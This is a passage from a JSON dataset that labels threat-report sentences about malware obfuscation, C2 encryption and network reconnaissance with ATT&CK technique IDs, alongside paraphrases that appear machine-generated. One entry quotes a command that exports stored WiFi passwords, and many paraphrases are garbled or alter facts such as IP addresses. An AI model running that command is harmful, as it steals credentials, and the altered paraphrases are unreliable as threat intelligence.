            "en_text": "This shellcode is decrypted in memory through EQENDT32.EXE",
            "data_text": "The shell code is decrypted from memory via EQENDT32.EXE"
        }
    ],
    "The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.": [
        {
            "tec_id": "T1027",
            "en_text": "The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.",
            "data_text": "The encrypted file contains a configuration file of 0x78 bytes. The data is decrypted using the 0xD9 XOR operation."
        }
    ],
    "The \"Blackwater.bas\" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer.": [
        {
            "tec_id": "T1027",
            "en_text": "The \"Blackwater.bas\" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer.",
            "data_text": "The \"Blackwater.bas\" macro was obfuscated using an alternate password, and the characters were replaced by the corresponding integer."
        }
    ],
    "The actors have made some small changes, such as altering the variable names to avoid Yara detection": [
        {
            "tec_id": "T1027",
            "en_text": "The actors have made some small changes, such as altering the variable names to avoid Yara detection",
            "data_text": "The actors made some changes, such as changing the variable name to avoid Yara's detection."
        }
    ],
    "To operate and evade standard analysis tools, most of the functions are hashed": [
        {
            "tec_id": "T1027",
            "en_text": "To operate and evade standard analysis tools, most of the functions are hashed",
            "data_text": "Most functions are hashed to operate and avoid standard analytical tools"
        }
    ],
    "Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.": [
        {
            "tec_id": "T1027",
            "en_text": "Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.",
            "data_text": "All strings are decrypted with different XOR parameters and some autoanalysts may fail."
        }
    ],
    "Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account": [
        {
            "tec_id": "T1573",
            "en_text": "Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account",
            "data_text": "Figure 6: Assembly View Reference Byte Mask in Sample 3 Root Installation Related Byte Array is applied to other byte arrays using a rolling dual XOR algorithm to configure the malware installation path, file name, and description for the Linux root account."
        }
    ],
    "The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b)": [
        {
            "tec_id": "T1573",
            "en_text": "The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b)",
            "data_text": "The encryption/decryption routine (see Figure 5) can be summarized as follows: Figure 5: Encryption/Decryption 0x00 to 0xff Integer Array Generation Scrambling the table state using the specified key. (b)Encrypts or decrypts a string using a scrambled table in ."
        }
    ],
    "Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session": [
        {
            "tec_id": "T1573",
            "en_text": "Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session",
            "data_text": "Instead of using the version 2 host ID as the key, this version uses an arbitrary XOR key that is 32 to 64 bytes long, which is generated for each session."
        }
    ],
    "A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code": [
        {
            "tec_id": "T1573",
            "en_text": "A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code",
            "data_text": "Build tools that allow operators to configure details such as C2 addresses, C2 encryption keys, and campaign codes may be being used by these attackers."
        }
    ],
    "After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption": [
        {
            "tec_id": "T1573",
            "en_text": "After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption",
            "data_text": "After applying this decryption algorithm, we receive the following data: h=HOSTNAME-PC"
        }
    ],
    "The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server": [
        {
            "tec_id": "T1573",
            "en_text": "The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server",
            "data_text": "The BONDUPDATER script is named based on the hard-coded string \"B007\" and uses a custom DGA algorithm to create a subdomain for communication with the C2 server."
        }
    ],
    "Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response": [
        {
            "tec_id": "T1573",
            "en_text": "Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response",
            "data_text": "Figure 9: Example of network communication In this example, the POWER client sends an arbitrary GET request to the C2 server and the C2 server sends an arbitrary number (9999999990) in response."
        }
    ],
    "The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2": [
        {
            "tec_id": "T1573",
            "en_text": "The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2",
            "data_text": "The structure of each outbound DNS request is as follows: <System ID>-<Work ID>-<Offset of data><more data flag>-<30-42 characters of base64 encoded data. The payload looks for different responses to these outbound queries, depending on the type of DNS request that payload uses to communicate with C2."
        }
    ],
    "The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie": [
        {
            "tec_id": "T1573",
            "en_text": "The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie",
            "data_text": "The C2 server provides a preshared key within the response data and provides a session ID value through the Set-Cookie field in the response, especially a string after the PHPSESSID parameter in the cookie."
        }
    ],
    "<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>   After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command": [
        {
            "tec_id": "T1573",
            "en_text": "<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>   After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command",
            "data_text": "<Click System Data>.<The same random number between 100000 and 999999 above.After obtaining the <c2 name> session ID and preshared key, the PowerShell script continues to communicate with the C2 server to obtain data to process as commands."
        }
    ],
    "Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:   <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>   To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers": [
        {
            "tec_id": "T1573",
            "en_text": "Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:   <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>   To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers",
            "data_text": "Instead, it immediately runs a query to resolve the next domain that it sends to C2 with a session ID value.Same random number between <100000 and 999999.<c2 domain name> To send data over DNS tunneling, the C2 server responds to the above query with an IPv6 address that contains the number of DNS queries that the payload must issue to obtain the full data from subsequent IPv6 responses."
        }
    ],
    "The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:   www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>   The payload will treat the data provided by the C2 as a message, which will have the following structure:   hello<char uuid[35]><char type[1]><data>   The message will start with the string hello followed by a 35-character UUID string": [
        {
            "tec_id": "T1573",
            "en_text": "The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:   www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>   The payload will treat the data provided by the C2 as a message, which will have the following structure:   hello<char uuid[35]><char type[1]><data>   The message will start with the string hello followed by a 35-character UUID string",
            "data_text": "The script sends a specified number of DNS queries using the following format: Each format responds with an IPv6 address that the script will treat as a data string. www.<sequence number>Same random number between <100000 and 999999.The <c2 domain name> payload treats the data provided by C2 as a message and has the following structure: The hello<char uuid[35]><char type[1]><data> message starts with the hello string followed by the 35-character UUID string."
        }
    ],
    "Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign": [
        {
            "tec_id": "T1016",
            "en_text": "Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign",
            "data_text": "This new domain or IP indicating that the sample in Table 3 may be associated with the new campaign has not been observed in the past."
        }
    ],
    "Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before": [
        {
            "tec_id": "T1016",
            "en_text": "Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before",
            "data_text": "Table 4: With the addition of URL parameters, the command string is hash using the same RGPH hash algorithm as before."
        }
    ],
    "Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post": [
        {
            "tec_id": "T1016",
            "en_text": "Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post",
            "data_text": "We analyzed the domain and IP address infrastructure used by APT15 and identified several similar domains shown at the bottom of the post."
        }
    ],
    "In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines": [
        {
            "tec_id": "T1016",
            "en_text": "In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines",
            "data_text": "For example, the log file recovered from an open index server revealed that the IP address (112.66.188.28), located in Hainan, China, was used to manage commands and control nodes communicating with malware on the victim's computer."
        }
    ],
    "APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration": [
        {
            "tec_id": "T1016",
            "en_text": "APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration",
            "data_text": "APT40 used MURKYSHEL to port scan IP addresses and perform network enumeration in a compromised victim organization."
        }
    ],
    "In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain": [
        {
            "tec_id": "T1016",
            "en_text": "In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain",
            "data_text": "To determine the domain held by xparis(), the variable pingadori() randomizes the domain using the radar() function."
        }
    ],
    "Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to": [
        {
            "tec_id": "T1016",
            "en_text": "Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to",
            "data_text": "Instructions in the guide.Describes how to perform DNS hijacking attacks on txt.txt, the example target is an enemy IP (185.162.235) corresponding to the legitimate domain to be redirected.It appears to have been shipped with 106 ."
        }
    ],
    "By running SSH on the server in a compromised network, attackers can come back to the network whenever they want": [
        {
            "tec_id": "T1016",
            "en_text": "By running SSH on the server in a compromised network, attackers can come back to the network whenever they want",
            "data_text": "You can run SSH on a server on a compromised network to allow attackers to access the network again whenever they want."
        }
    ],
    "Note that IP addresses can be reallocated": [
        {
            "tec_id": "T1016",
            "en_text": "Note that IP addresses can be reallocated",
            "data_text": "IP addresses can be reassigned."
        }
    ],
    "Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations": [
        {
            "tec_id": "T1016",
            "en_text": "Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations",
            "data_text": "Backdoor.Pirpi also collects information about the target's local network, including domain controllers and workstations."
        }
    ],
    "It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway": [
        {
            "tec_id": "T1016",
            "en_text": "It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway",
            "data_text": "It also collects network information such as MAC addresses, IP addresses, WINS, DHCP servers, and gateways."
        }
    ],
    "Regular Expressions   ([^r-v\\\\s])[r-v]([\\\\w\\\\d+\\\\/=]+)-\\\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\\\w|:]+){1,8})   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(\\\\d+.\\\\d+.\\\\d+.\\\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers": [
        {
            "tec_id": "T1016",
            "en_text": "Regular Expressions   ([^r-v\\\\s])[r-v]([\\\\w\\\\d+\\\\/=]+)-\\\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\\\w|:]+){1,8})   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(\\\\d+.\\\\d+.\\\\d+.\\\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers",
            "data_text": "Regular expression ([^r-v\\s])[r-v]([\\w\\d+\\/=]+)-\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)Address:\\s+([a-fA-F0-9]{0,4:1,4[\\w|:+]{1,8)Address:\\s+([a-fA-F-F0-9){/2}(<domainList)[0][0])(List(List)[1])determines the query type."
        }
    ],
    "Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123": [
        {
            "tec_id": "T1016",
            "en_text": "Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123",
            "data_text": "A previous IP resolution check found 107.175.75[.]123, a common IP between active name servers."
        }
    ],
    "This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure": [
        {
            "tec_id": "T1016",
            "en_text": "This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure",
            "data_text": "This IP is of particular interest because it has revealed that the previous domain resolution of this IP has also been resolved by hotmai1l[.com], a domain previously identified as highly likely associated with the Dark Hydrus infrastructure."
        }
    ],
    "This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name": [
        {
            "tec_id": "T1016",
            "en_text": "This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name",
            "data_text": "This IP also falls within the same service provider and class B network range as the other IP associated with DarkHydrus, 107.175.150[.113], specifically resolved with a domain name containing the name of the victim organization."
        }
    ],
    "After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with": [
        {
            "tec_id": "T1016",
            "en_text": "After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with",
            "data_text": "After the second DLL is loaded into memory, the first DLL effectively changes the address to which the malware communicates by overwriting the control server's IP address."
        }
    ],
    "DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network": [
        {
            "tec_id": "T1016",
            "en_text": "DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network",
            "data_text": "DHS and the FBI are distributing these IP addresses to enable network defense activities and reduce exposure to DDoS command and control networks."
        }
    ],
    "FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S": [
        {
            "tec_id": "T1016",
            "en_text": "FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S",
            "data_text": "The FBI is confident that HIDDEN COBRA actors are using IP addresses to exploit additional networks.The alert includes technical indicators related to specific cyber operations by the North Korean government, and provides information on proposed countermeasures, recommended mitigation techniques, and incident reporting to the United States.s"
        }
    ],
    "If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie": [
        {
            "tec_id": "T1016",
            "en_text": "If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie",
            "data_text": "If you no longer need Adobe Flash or Microsoft Silverlight, we recommend that you remove the application from your system.The IOC provided with this warning includes the IP address determined as part of the HIDDEN COBRA botnet infrastructure identified as DeltaCharlie."
        }
    ],
    "DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems": [
        {
            "tec_id": "T1016",
            "en_text": "DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems",
            "data_text": "DHS and the FBI recommend that network administrators review provided IP addresses, file hashes, network signatures, and YARA rules, and add their IPs to the watch list to determine if malicious activity has been observed within the organization.When reviewing the network boundary logs for IP addresses, organizations can discover numerous instances of these IP addresses that attempt to connect to the system."
        }
    ],
    "The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system": [
        {
            "tec_id": "T1016",
            "en_text": "The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system",
            "data_text": "To achieve code execution on the system, the IP address of the lateral movement technique has been replaced with the local system IP address."
        }
    ],
    "When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network": [
        {
            "tec_id": "T1016",
            "en_text": "When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network",
            "data_text": "When we analyzed the email header, we confirmed that the email was sent from the SMTP server using the IP associated with Yonsei University network."
        }
    ],
    "text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list": [
        {
            "tec_id": "T1016",
            "en_text": "text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list",
            "data_text": "The text=from=ai=ags=oe=aq=btnG=oprnd=ai=utm=channel= command and the page address in the domain of the control server are randomly selected from the list."
        }
    ],
    "Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses": [
        {
            "tec_id": "T1016",
            "en_text": "Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses",
            "data_text": "After analyzing the configuration, the C2 server used both the fully qualified domain name and IP address."
        }
    ],
    "The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC address and hostname": [
        {
            "tec_id": "T1016",
            "en_text": "The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC address and hostname",
            "data_text": "Retriver Trojan uses namespaces using pcchekapp.grp.ammar.samaneh; Android.Malware begins by creating a Web service object and uses the following URL within the configuration: http://service.chrome-up[.date:8080/WebService.asmx] calls a function called \"SetLog2\" that sets variables for the system's IP address, MAC address, and hostname."
        }
    ],
    "The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system": [
        {
            "tec_id": "T1016",
            "en_text": "The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system",
            "data_text": "The code collects some information about the system, especially local IP addresses, MAC addresses, and external IP addresses of the system."
        }
    ],
    "Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a “campaign identifier.” Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets": [
        {
            "tec_id": "T1016",
            "en_text": "Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a “campaign identifier.” Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets",
            "data_text": "Similar to Reaver published by Palo Alto, the IP or domain of C is obtained."
        }
    ],
    "Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”": [
        {
            "tec_id": "T1016",
            "en_text": "Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”",
            "data_text": "The victim system reconnaissance code attempts to acquire the victim's public IP via \"https://api.ipify.org/\"."
        }
    ],
    "The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim": [
        {
            "tec_id": "T1016",
            "en_text": "The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim",
            "data_text": "This will encrypt the previously selected URL, register a new victim, and publish a public IP with the OS version, internal IP, system name, domain name, and user name."
        }
    ],
    "If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1": [
        {
            "tec_id": "T1016",
            "en_text": "If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1",
            "data_text": "The first resolved domain IP address is set to 1 when it starts with 24.125.X.X."
        }
    ],
    "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure": [
        {
            "tec_id": "T1016",
            "en_text": "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure",
            "data_text": "We don't know what these domains were used for, but based on the similarities between domain spoofing and IP sharing, they are likely part of a hostile infrastructure."
        }
    ],
    "The email address is associated with the Lebanese domain of a major global financial institution": [
        {
            "tec_id": "T1016",
            "en_text": "The email address is associated with the Lebanese domain of a major global financial institution",
            "data_text": "The email address is linked to the Lebanese domain of major global financial institutions."
        }
    ],
    "Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017": [
        {
            "tec_id": "T1016",
            "en_text": "Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017",
            "data_text": "Examining a Class C network for 185.162.235.0/24, you can see that different IPs in the same network resolve to the OilRig domain, msoffice-cdn[.com], identified in August 2017."
        }
    ],
    "The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)": [
        {
            "tec_id": "T1016",
            "en_text": "The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)",
            "data_text": "The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05010001 c0b8 3ce50051\" and verifies that the first two bytes of the server are \"0500\" (c0b8 3ce5 is the IP address and 0051 is the port in network byte order)."
        }
    ],
    "The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document": [
        {
            "tec_id": "T1016",
            "en_text": "The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
            "data_text": "The chinapolicyanalysis.org domain was used as the source address and host location for malicious RTF documents."
        }
    ],
    "The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document": [
        {
            "tec_id": "T1016",
            "en_text": "The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
            "data_text": "The mericcs.org domain was used as the source address and host location for malicious RTF documents."
        }
    ],
    "The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org": [
        {
            "tec_id": "T1016",
            "en_text": "The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org",
            "data_text": "The structure of the domain is similar to that of the Meritor Institute for China Studies (MERICS), where the real domain is merics.org."
        }
    ],
    "Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking": [
        {
            "tec_id": "T1016",
            "en_text": "Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking",
            "data_text": "Network Indicator Hostname IP Address Notes Mail Center.support 221.121.138.139 support Domains used for spearfishing and user tracking"
        }
    ],
    "chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents": [
        {
            "tec_id": "T1016",
            "en_text": "chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents",
            "data_text": "chinapolicyanalysis.org 185.130.212.168 Domain used to retrieve sender email addresses and host malicious documents"
        }
    ],
    "fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents": [
        {
            "tec_id": "T1016",
            "en_text": "fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents",
            "data_text": "fprii.net 185.130.212.254 Domain used to retrieve sender email addresses and host malicious documents"
        }
    ],
    "mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents": [
        {
            "tec_id": "T1016",
            "en_text": "mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents",
            "data_text": "mericcs.org 221.121.165.1991 Domain used for scanning source email addresses and hosting malicious documents"
        }
    ],
    "In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97": [
        {
            "tec_id": "T1016",
            "en_text": "In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97",
            "data_text": "In February 2018, several KHRAT-related domains began to be identified with IP address 89.46.222[.97]."
        }
    ],
    "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies": [
        {
            "tec_id": "T1016",
            "en_text": "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies",
            "data_text": "Examination of passiveDNS (pDNS) records in PassiveTotal shows that multiple domain names associated with this IP mimic the popular technology company."
        }
    ],
    "One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address": [
        {
            "tec_id": "T1016",
            "en_text": "One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address",
            "data_text": "One of these domains, Facebook-apps [.com], was found in one of the malware samples associated with this IP address."
        }
    ],
    "The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two": [
        {
            "tec_id": "T1016",
            "en_text": "The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two",
            "data_text": "The diagram in Figure 1 shows the samples, domains, IP addresses, and email addresses that you identified during the investigation (see Appendix B for details on them). There is no overlapping infrastructure between Cluster A and Cluster B, and there is a clear division."
        }
    ],
    "RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation": [
        {
            "tec_id": "T1016",
            "en_text": "RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation",
            "data_text": "Sample analysis of the RATANKBA hacking tool (HKTL_NBTSCAN) that finds a specific IP range.GA and HKTL_NBTSCAN.GB) Represents as a command-line program to discover NetB on the IP network.IOS information such as IP address, NetBIOS computer name, logged in user name, and MAC address—some of the information obtained from the initial RATAKNBA installation"
        }
    ],
    "One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=\"%APPDATA%\" They then gather more network information with a call to ipconfig and arp -a": [
        {
            "tec_id": "T1016",
